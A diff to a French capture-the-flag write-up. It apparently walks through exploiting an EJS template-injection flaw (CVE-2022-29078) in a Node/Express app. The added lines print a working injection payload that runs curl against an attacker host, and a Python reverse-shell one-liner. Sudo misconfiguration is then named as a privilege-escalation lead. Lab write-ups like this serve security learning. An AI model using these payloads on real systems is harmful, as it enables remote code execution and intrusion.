@@ -125,7 +125,7 @@ En analysant les headers, on confirme que l’app utilise :
 - Templates EJS
 C’est une fuite de stack exploitable pour rechercher des CVE ou cibler des vulnérabilités spécifiques Node / Express / EJS.
 
-L'erreur nous permet de savoir le templates utilisé par EJS (Embedded JavaScript) pour afficher le mot de passe sur la page après update grâce aux balises `<% %>`. Sur internet on trouve facilement de nombreuses ressources sur la faille SSTI avec EJS, dont ces ressources parlant de la CVE-2022-29078 (ejs server side template injection rce) :
+L'erreur nous permet de savoir le templates utilisé par EJS (Embedded JavaScript) pour afficher le mot de passe sur la page après update grâce aux balises. Sur internet on trouve facilement de nombreuses ressources sur la faille SSTI avec EJS, dont ces ressources parlant de la CVE-2022-29078 (ejs server side template injection rce) :
 - https://github.com/mde/ejs/issues/720
 - https://eslam.io/posts/ejs-server-side-template-injection-rce/
 
@@ -135,5 +135,50 @@ L'erreur nous permet de savoir le templates utilisé par EJS (Embedded JavaScrip
 
 <!--
 ![image](https://github.com/user-attachments/assets/325a006a-abb1-4804-a828-b8b84af44acb)
+-->
+
+La payload suivante me permet de m'assurer que la SSTI fonctionne et que l'on peut effectuer une exécution de code à distance (RCE) :
+name=a&passord=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 192.168.202.44:8000');s
+<!--
+![image](https://github.com/user-attachments/assets/033eddbe-4e57-45e2-8ffb-b14d3382cd15)
+-->
+
+Ca fonctionne !
+<!--
+![image](https://github.com/user-attachments/assets/50af5687-c714-4ecb-973d-f3b73c27adeb)
+-->
+
+Maintenant, nous pouvons l'utiliser pour obtenir un shell, d'abord en utilisant notre serveur web pour servir une charge utile de shell inversé.
+
+On créer un fichier 'payload.py', et y mets la charge utile :
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.202.44",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+<!--
+![image](https://github.com/user-attachments/assets/72ea4b3d-4283-4718-97b2-9e9b80fcabbb)
+-->
+<!--
+![image](https://github.com/user-attachments/assets/9a31ed45-006d-4180-af08-688cc6c392ad)
+-->
+<!--
+![image](https://github.com/user-attachments/assets/e862b1c2-9371-43c6-8add-33cc70ba0e8d)
+-->
+
+On effectue une shell stabilization :
+<!--
+![image](https://github.com/user-attachments/assets/ef5be721-2c95-4cc9-89c3-b5b04de621e9)
+-->
+
+On trouve le flag user.txt dans le home de l'utilisateur web.
+<!--
+![image](https://github.com/user-attachments/assets/7fe17284-4f45-4755-9b8a-1ba85dd74e56)
+-->
+
+Liste ce que l’utilisateur web peut exécuter avec sudo. On apprend que l’utilisateur web peut modifier un fichier de configuration Nginx en tant que root, sans mot de passe.
+<!--
+![image](https://github.com/user-attachments/assets/549edde0-3acd-4571-ae35-6f200a31c15f)
+-->
+
+En vérifiant la version de sudo, nous voyons qu'il s'agit de la version 1.9.12p1.
+<!--
+![image](https://github.com/user-attachments/assets/a6e74132-eecb-4d01-bf05-bfaadc59fb39)
 -->
 
